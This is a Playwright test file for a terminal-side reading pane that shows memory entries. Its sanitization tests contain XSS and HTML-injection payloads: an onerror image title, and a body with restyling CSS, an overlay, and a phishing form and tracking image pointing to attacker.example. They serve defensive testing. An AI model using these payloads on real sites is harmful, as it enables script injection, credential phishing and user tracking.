// The reading pane beside the terminal: an entry the session writes opens as it lands,
// and the recent entries are listed under it.
import { test, expect, ids, root } from './support/fixtures';
import { execFileSync } from 'node:child_process';
import { join } from 'node:path';

const amem = process.env.AMEM ?? join(__dirname, '..', '..', 'target', 'debug', 'amem');

test('an entry written during the session opens in the pane as it lands', async ({ signedIn: page }) => {
  await page.locator('#harness').selectOption('claude');
  await page.getByRole('button', { name: 'Start session' }).click();
  await expect(page.locator('.xterm-rows')).toContainText('e2e session: ready');
  // the seeded entries are listed, newest first
  await expect(page.locator('#recent')).toContainText('Leases expire at a fixed horizon');

  execFileSync(amem, ['--root', root, 'write', '--kind', 'handoff', '--title', 'Stopped at the pane test',
    '--body', 'Next: **the status strip**.'], { cwd: '/tmp' });
  await expect(page.locator('#ptitle')).toHaveText('Stopped at the pane test');
  await expect(page.locator('#body strong')).toHaveText('the status strip');
  await expect(page.locator('#why')).toHaveText('Landed during this session');
});

test('a recent entry opens when clicked', async ({ signedIn: page }) => {
  await page.locator('#harness').selectOption('claude');
  await page.getByRole('button', { name: 'Start session' }).click();
  await page.locator('#recent a', { hasText: 'The ledger\'s clock is its own' }).click();
  await expect(page.locator('#ptitle')).toHaveText('The ledger\'s clock is its own');
  await expect(page.locator('#kind')).toContainText('fact');
  await expect(page.locator('#emeta')).toContainText('internal');
  await expect(page.locator('#recent a[aria-current="true"]')).toContainText('The ledger\'s clock is its own');
  expect(ids()).toHaveLength(3);
});

test('a title is shown as text, never run as markup', async ({ signedIn: page }) => {
  await page.locator('#harness').selectOption('claude');
  await page.getByRole('button', { name: 'Start session' }).click();
  await expect(page.locator('.xterm-rows')).toContainText('e2e session: ready');
  const title = '<img src=x onerror="window.pwned=1">';
  execFileSync(amem, ['--root', root, 'write', '--kind', 'fact', '--title', title, '--body', 'x'], { cwd: '/tmp' });
  await expect(page.locator('#recent')).toContainText(title);
  await expect(page.locator('#recent img')).toHaveCount(0);
  await expect(page.locator('#ptitle')).toHaveText(title);
  expect(await page.evaluate(() => (window as unknown as { pwned?: number }).pwned)).toBeUndefined();
});

test('below 720px the terminal and the record are two tabs', async ({ signedIn: page }) => {
  await page.setViewportSize({ width: 360, height: 760 });
  await page.locator('#harness').selectOption('claude');
  await page.getByRole('button', { name: 'Start session' }).click();
  await expect(page.locator('.xterm-rows')).toContainText('e2e session: ready');
  const record = page.getByRole('tab', { name: /^Record/ });
  await expect(page.getByRole('tab', { name: 'Terminal' })).toHaveAttribute('aria-selected', 'true');
  await expect(page.locator('#pane')).toBeHidden();
  // an entry landing while the terminal is shown is counted on the record's tab
  execFileSync(amem, ['--root', root, 'write', '--kind', 'fact', '--title', 'Counted on the tab', '--body', 'x'], { cwd: '/tmp' });
  await expect(record).toContainText('1');
  await record.click();
  await expect(page.locator('#pane')).toBeVisible();
  await expect(page.locator('#ptitle')).toHaveText('Counted on the tab');
  await expect(record).toHaveText('Record');
});

test('an entry body cannot restyle the page around it or put a form on it', async ({ signedIn: page }) => {
  await page.locator('#harness').selectOption('claude');
  await page.getByRole('button', { name: 'Start session' }).click();
  await expect(page.locator('.xterm-rows')).toContainText('e2e session: ready');
  const body = [
    'Notes.',
    '',
    '<style>.am-chip--warn{display:none} body{background:red}</style>',
    '<div style="position:fixed;inset:0">over everything</div>',
    '<form action="http://attacker.example/"><input name="k"><button>Pair again</button></form>',
    '<img src="http://attacker.example/seen.gif">',
  ].join('\n');
  execFileSync(amem, ['--root', root, 'write', '--kind', 'fact', '--title', 'A body with markup', '--body', body], { cwd: '/tmp' });
  await expect(page.locator('#ptitle')).toHaveText('A body with markup');
  const pane = page.locator('#body');
  await expect(pane).toContainText('over everything');
  await expect(pane.locator('style, form, input, button, [style]')).toHaveCount(0);
  await expect(pane.locator('img[src]')).toHaveCount(0);
  await expect(page.locator('#s-label .am-chip--warn')).toBeVisible();
});
